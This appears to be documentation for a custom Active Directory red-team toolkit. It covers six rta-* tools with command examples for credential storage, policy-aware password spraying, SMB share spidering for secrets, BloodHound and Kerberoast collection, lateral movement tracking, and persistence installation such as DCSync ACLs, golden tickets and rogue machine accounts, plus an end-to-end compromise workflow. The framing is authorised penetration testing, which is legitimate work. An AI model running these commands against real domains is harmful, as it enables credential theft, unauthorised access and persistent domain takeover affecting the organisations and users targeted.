AD Engagement Tools

Six custom tools purpose-built for Active Directory red team engagements. These fill operational gaps between existing tools — managing credentials across hosts, spraying safely within lockout policies, spidering shares for loot, tracking lateral movement progress, automating BloodHound collection, and installing/auditing persistence.

All tools are installed by the attacker setup script and available as rta-* commands.

rta-credstore — Credential Manager

The core problem: during an AD engagement you collect credentials from dozens of sources (secretsdump, Kerberoasting, LSASS dumps, config files) and need to track which creds work on which hosts. This tool maintains a local encrypted database of all credentials and their test results.

# Add credentials manually
rta-credstore add -u jsmith -p 'P@ssw0rd!' -d corp.local
rta-credstore add -u admin -H 'aad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76' -d corp.local

# Import from secretsdump output
rta-credstore import --file ntds-dump.txt --format secretsdump

# Import Kerberoast hashes
rta-credstore import --file kerberoast-hashes.txt --format kerberoast

# List all credentials
rta-credstore list
rta-credstore list --domain corp.local --type hash

# Test a specific credential against a target
rta-credstore test -u jsmith -t 192.168.56.10 --proto smb

# Spray ALL credentials against a target (or CIDR)
rta-credstore spray --target 192.168.56.0/24 --proto smb --delay 5

# Export for cracking
rta-credstore export --format hashcat -o hashes.txt

# Engagement summary
rta-credstore summary

The credential database tracks which hosts each credential has been tested against, which ones were valid, and which have admin access. It prevents wasting time retesting credentials and avoids accidental lockouts from testing the same cred twice.

rta-sprayguard — Policy-Aware Password Sprayer

Queries the domain password policy before spraying and automatically stays within lockout thresholds. Handles the math of "N attempts then wait M minutes" so you don't lock accounts.

# Check the password policy first
rta-sprayguard policy -t 192.168.56.10 -d corp.local -u jsmith -p 'P@ss'

# Output:
#   Lockout Threshold:    5 attempts
#   Observation Window:   30 minutes
#   Safe spray: 3 attempts per user, then wait 30 minutes

# Spray with automatic policy enforcement
rta-sprayguard spray -t 192.168.56.10 -d corp.local \
  -U users.txt -P passwords.txt \
  --auth-user jsmith --auth-pass 'P@ss'

# Single password against all users
rta-sprayguard spray -t 192.168.56.10 -d corp.local \
  -U users.txt -p 'Spring2024!'

# Force spray without policy check (dangerous)
rta-sprayguard spray -t 192.168.56.10 -d corp.local \
  -U users.txt -P passwords.txt --force --max-attempts 2

Key safety features:

  • Queries lockout threshold before spraying — calculates safe attempt count
  • Auto-waits between spray windows (observation window duration)
  • Immediately stops spraying a user if STATUS_ACCOUNT_LOCKED_OUT is returned
  • Skips users that already have valid credentials
  • Conservative defaults (2 attempts, 30 minute wait) when policy query fails

rta-sharespider — SMB Share Spider

Recursively searches SMB shares for files that commonly contain credentials: KeePass databases, config files with connection strings, scripts with hardcoded passwords, private keys, GPP passwords, and more. Optionally downloads and scans file contents for credential patterns.

# Spider all readable shares on a target
rta-sharespider -t 192.168.56.10 -u jsmith -p 'P@ss' -d corp.local

# Spider with content scanning (downloads and greps for passwords)
rta-sharespider -t 192.168.56.10 -u jsmith -p 'P@ss' -d corp.local --download

# Spider specific shares
rta-sharespider -t 192.168.56.10 -u admin -H 'LM:NT' -d corp --shares SYSVOL IT

# Spider multiple targets from a file
rta-sharespider -t targets.txt -u jsmith -p 'P@ss' -d corp -o findings.json

What it looks for:

CategoryFile Patterns
Credential stores.kdbx, .pfx, .pem, .key, .ppk, id_rsa
Config filesweb.config, .env, appsettings.json, wp-config.php, .htpasswd
Scripts.ps1, .bat, .vbs (scanned for hardcoded credentials)
AD/Windowsunattend.xml, groups.xml (GPP), NTDS.dit, SAM, SECURITY
Password filespass*.txt, password*.xlsx, cred*.csv
Network.ovpn, .rdp, .rdg, .ssh/config

Content scanning checks downloaded files for patterns like password=, connectionstring, PRIVATE KEY, aws_secret_access_key, ConvertTo-SecureString, and 15+ other credential indicators.

rta-bhingest — BloodHound Collection & Attack Paths

One-command BloodHound data collection plus automated LDAP queries for high-value attack paths. Generates a report of Kerberoastable accounts, AS-REP roastable users, unconstrained delegation, GPP passwords, LAPS passwords, and user descriptions that may contain credentials.

# Full collection + attack path queries
rta-bhingest -t 192.168.56.10 -d corp.local -u jsmith -p 'P@ss'

# With hash authentication
rta-bhingest -t 192.168.56.10 -d corp.local -u admin -H 'NT_HASH'

# Output:
#   bloodhound-20240415-143022/
#   ├── *_bloodhound.zip          # Import into BloodHound CE
#   ├── kerberoast.txt            # Hashcat -m 13100 ready
#   ├── asrep.txt                 # Hashcat -m 18200 ready
#   └── attack-paths.txt          # Summary of all findings

Queries run automatically:

  • Kerberoastable accounts (SPN set)
  • AS-REP roastable accounts (PreAuth disabled)
  • Unconstrained delegation (computer accounts)
  • Accounts with PASSWD_NOTREQD flag
  • AdminCount=1 users (privileged account history)
  • User descriptions (frequently contain passwords)
  • GPP passwords (Group Policy Preferences)
  • LAPS passwords (if readable)

rta-adpersist — AD Persistence Installer & Auditor

Automates common AD persistence techniques and includes a cleanup mode for post-engagement removal. Each method includes OPSEC risk rating and detection context.

# List available persistence methods with OPSEC ratings
rta-adpersist list-methods

# Audit existing persistence on the domain
rta-adpersist audit -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local

# Grant DCSync rights to a user
rta-adpersist install --method dcsync-acl \
  -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local \
  --target-user backdoor_user

# Extract krbtgt hash for golden ticket
rta-adpersist install --method golden-ticket \
  -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local

# Add a rogue machine account
rta-adpersist install --method machine-account \
  -t 192.168.56.10 -u jsmith -p 'Pass' -d corp.local

# Clean up — remove DCSync ACL after engagement
rta-adpersist clean --method dcsync-acl \
  -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local \
  --target-user backdoor_user

Supported persistence methods:

MethodOPSECDescription
dcsync-aclMEDIUMGrant replication rights to a user (DCSync without DA)
golden-ticketLOW/HIGHExtract krbtgt hash, forge TGT for any user
silver-ticketLOWForge TGS for specific service (no DC interaction)
skeleton-keyHIGHPatch LSASS on DC for master password
admin-sdhMEDIUMModify AdminSDHolder for persistent admin ACL
sid-historyMEDIUMInject DA SID into user’s SID History
machine-accountLOWAdd rogue computer to domain (any domain user)

rta-lateralmap — Engagement State Tracker

Tracks which hosts you have compromised, what level of access you have, and identifies the next best lateral movement targets. Integrates with rta-credstore to test credentials across the network.

# Add hosts to the map
rta-lateralmap add-host 192.168.56.10 --name DC01 --role dc --access admin
rta-lateralmap add-host 192.168.56.20 --name WS01 --role workstation
rta-lateralmap add-host 192.168.56.30 --name SRV01 --role server --access user

# Import hosts from nmap scan
rta-lateralmap import-nmap --file nmap-scan.gnmap

# Test lateral movement from a compromised host
rta-lateralmap scan --from 192.168.56.10

# View the engagement map
rta-lateralmap map

# Output:
#   ── Engagement Map (3 hosts) ──
#
#   Status  IP                Name            Role     Access  Valid  Admin
#   ───────────────────────────────────────────────────────────────────────
#   admin   192.168.56.10     DC01            [DC]     admin   3      2
#   user    192.168.56.30     SRV01           [SRV]    user    1      0
#   none    192.168.56.20     WS01            [WS]     none    0      0
#
#   ── Lateral Movement Paths ──
#   192.168.56.10 ==> 192.168.56.30 (cred #2, admin)

# Get suggested next actions
rta-lateralmap suggest

# Export engagement report
rta-lateralmap export -o engagement-report.json

Tool Integration Workflow

The AD tools are designed to work together. Here is a typical engagement workflow:

# 1. Initial foothold — you have domain user creds
rta-credstore add -u jsmith -p 'Welcome1!' -d corp.local

# 2. Discover hosts and attack paths
rta-bhingest -t 10.10.10.10 -d corp.local -u jsmith -p 'Welcome1!'

# 3. Import discovered hosts
rta-lateralmap import-nmap --file nmap-scan.gnmap

# 4. Spider shares for more credentials
rta-sharespider -t 10.10.10.10 -u jsmith -p 'Welcome1!' -d corp.local --download
# Found web.config with SA password → add it
rta-credstore add -u sa -p 'SQLp@ss!' --source 'sharespider:web.config'

# 5. Crack Kerberoast hashes, import results
hashcat -m 13100 bloodhound-*/kerberoast.txt /opt/wordlists/rockyou.txt
rta-credstore add -u svc_sql -p 'Summer2024!' -d corp.local --source kerberoast

# 6. Spray new passwords (policy-aware)
rta-sprayguard spray -t 10.10.10.10 -d corp.local \
  -U users.txt -p 'Summer2024!' \
  --auth-user jsmith --auth-pass 'Welcome1!'

# 7. Test all creds for lateral movement
rta-lateralmap scan --from 10.10.10.10

# 8. Check where we are and what to do next
rta-lateralmap map
rta-lateralmap suggest

# 9. Got DA — install persistence
rta-adpersist install --method golden-ticket \
  -t 10.10.10.10 -u DA_admin -p 'Pass' -d corp.local

# 10. End of engagement — clean up
rta-adpersist clean --method dcsync-acl \
  -t 10.10.10.10 -u DA_admin -p 'Pass' -d corp.local \
  --target-user backdoor
